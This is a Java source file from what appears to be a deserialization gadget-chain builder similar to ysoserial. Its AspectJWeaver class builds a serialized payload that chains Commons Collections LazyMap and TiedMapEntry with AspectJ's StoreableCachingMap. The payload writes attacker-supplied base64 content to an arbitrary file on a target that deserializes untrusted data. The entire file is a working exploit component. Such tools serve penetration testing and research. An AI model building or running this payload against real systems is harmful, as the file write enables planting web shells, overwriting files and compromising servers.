package org.ses.gadgetbuilder.chains1;

import org.apache.commons.codec.binary.Base64;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.noparam.HashCodeTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import java.lang.reflect.Constructor;
import java.util.Map;

@Dependencies({"org.aspectj:aspectjweaver:1.9.2", "commons-collections:commons-collections:3.2.2"})
@Authors({ Authors.JANG })
@Impact(Impact.FileWrite)
public class AspectJWeaver extends GadgetChain<HashCodeTrampoline> {

    public AspectJWeaver(HashCodeTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {
        int sep = command.lastIndexOf(':');
        String[] parts = command.split(":");
        String filename = parts[0];
        byte[] content = Base64.decodeBase64(parts[1]);

        Constructor ctor = Reflections.getFirstCtor("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Object simpleCache = ctor.newInstance(".", 12);
        Transformer ct = new ConstantTransformer(content);
        Map lazyMap = LazyMap.decorate((Map)simpleCache, ct);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, filename);

        return new TrampolineConnector(entry);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()\n" +
                "org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()\n" +
                "org.apache.commons.collections.map.LazyMap.get()\n" +
                "org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap.put()\n" +
                "org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap.writeToPath()\n" +
                "java.io.FileOutputStream.write()";
    }

    @Override
    protected String getCommandFormat() {
        return "<filename>:<base64 Object>";
    }


}
